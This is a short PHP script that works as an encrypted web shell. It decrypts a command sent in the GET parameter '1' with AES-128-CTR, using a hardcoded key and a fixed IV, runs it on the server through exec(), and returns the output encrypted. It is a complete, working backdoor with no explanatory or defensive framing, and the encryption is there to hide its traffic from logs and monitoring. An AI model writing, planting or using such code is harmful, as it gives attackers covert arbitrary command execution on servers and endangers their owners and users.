<?php



$ciphering = "AES-128-CTR";

$iv_length = openssl_cipher_iv_length($ciphering);

$options = 0;

$encryption_iv = '1234567891011121';

$encryption_key = "codespace";

$msg = $_GET['1'];

$decryption=openssl_decrypt($msg, $ciphering,
            $encryption_key, $options, $encryption_iv);
$output = exec("$decryption | tr '\n' '||'");
$encryption = openssl_encrypt($output, $ciphering,
            $encryption_key, $options, $encryption_iv);
echo $encryption;
?>
